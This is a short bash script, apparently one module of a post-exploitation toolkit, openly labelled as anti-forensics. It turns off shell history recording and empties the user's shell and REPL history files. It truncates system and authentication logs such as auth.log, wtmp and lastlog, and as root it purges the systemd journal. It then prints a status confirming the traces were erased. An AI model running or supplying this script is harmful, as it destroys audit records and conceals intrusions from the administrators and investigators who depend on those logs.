#!/bin/bash
# -----------------------------------------------------------------------------
# Executes anti-forensics routines to minimize session traces and clear audit
# logs.
# -----------------------------------------------------------------------------

# Disable History for Current Session
unset HISTFILE
export HISTSIZE=0
export HISTFILESIZE=0
export HISTCONTROL="ignorespace:ignoredups"
set +o history 2>/dev/null

# Truncate User Shell & REPL History Files
for hist in "$HOME/.bash_history" "$HOME/.zsh_history" "$HOME/.sh_history" "$HOME/.python_history" "$HOME/.lesshst"; do
    if [ -f "$hist" ] && [ -w "$hist" ]; then
        : > "$hist" 2>/dev/null
    fi
done
history -c 2>/dev/null

# Truncate Accessible System Logs
for logfile in /var/log/syslog /var/log/auth.log /var/log/secure /var/log/messages /var/log/wtmp /var/log/btmp /var/log/lastlog; do
    if [ -f "$logfile" ] && [ -w "$logfile" ]; then
        : > "$logfile" 2>/dev/null
    fi
done

if [ "$(id -u 2>/dev/null || echo 1)" -eq 0 ] && _have journalctl; then
    journalctl --rotate >/dev/null 2>&1
    journalctl --vacuum-time=1s >/dev/null 2>&1
fi

(
    printf '[+] Session history recording disabled\n'
    printf '[+] Accessible user history and system log files truncated\n'
) | label "Anti-Forensics Status"
